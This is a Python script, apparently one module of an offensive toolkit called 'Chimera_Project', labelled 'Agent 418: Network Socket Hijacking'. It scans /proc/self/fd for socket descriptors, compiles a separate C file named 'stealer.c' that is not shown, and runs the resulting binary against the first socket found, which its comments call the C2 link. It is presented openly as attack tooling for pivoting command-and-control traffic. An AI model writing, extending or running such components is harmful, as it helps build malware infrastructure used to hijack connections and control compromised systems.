#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess
import sys

class SocketStealer:
    """
    Agent 418: Network Socket Hijacking.
    Scans /proc/self/fd to find established network connections 
    and utilizes 'dup' primitives to pivot C2 traffic.
    """
    def find_active_sockets(self):
        """Scans for open network file descriptors."""
        print("[*] Scanning local FD table for active sockets...")
        sockets = []
        fd_path = "/proc/self/fd"
        for fd in os.listdir(fd_path):
            try:
                link = os.readlink(os.path.join(fd_path, fd))
                if "socket:" in link:
                    sockets.append(fd)
            except: pass
        return sockets

    def execute(self):
        print("--- [AGENT 418: SOCKET STEALING SEQUENCE] ---")
        src = "/home/dan/Chimera_Project/agents/418_Socket_Stealer/src/stealer.c"
        bin_out = "/home/dan/Chimera_Project/agents/418_Socket_Stealer/src/stealer"
        
        # 1. Compile
        subprocess.run(["gcc", src, "-o", bin_out], check=True)
        
        # 2. Find a socket to hijack
        active_fds = self.find_active_sockets()
        if not active_fds:
            print("[!] No active sockets found to hijack.")
            return

        # Hijack the first available socket (usually the C2 link)
        target = active_fds[0]
        subprocess.run([bin_out, target])

if __name__ == "__main__":
    SocketStealer().execute()
